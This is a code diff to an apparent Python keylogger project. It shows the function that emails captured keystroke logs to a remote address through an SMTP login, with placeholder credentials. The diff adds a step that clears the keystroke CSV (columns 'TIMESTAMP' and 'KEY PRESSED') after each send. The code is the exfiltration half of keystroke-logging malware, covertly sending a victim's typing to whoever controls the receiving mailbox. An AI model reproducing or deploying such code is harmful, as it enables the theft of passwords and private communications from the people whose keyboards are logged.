@@ -3,13 +3,14 @@ from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+import csv
 
 def sendEmail(tetxt):
     subject = tetxt
     body = "This is an email with keylogger attachment sent from Python"
-    sender_email = "sender@gmail.com"
+    sender_email = "sender@email.com"
     receiver_email = "receiver@gmail.com"   
-    password = "App password"  #Google App password and 2-step verification must be on 
+    password = "Password"  #Google App password and 2-step verification must be on 
 
     # Create a multipart message and set headers
     message = MIMEMultipart()
@@ -46,3 +47,8 @@ def sendEmail(tetxt):
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, text)
         
+    #Clearing the data file for new data entry :
+    with open('Datafile/data.csv', mode ='w', newline='') as file:
+     csvwriter = csv.writer(file) 
+     csvwriter.writerows([['TIMESTAMP', 'KEY PRESSED']])
+
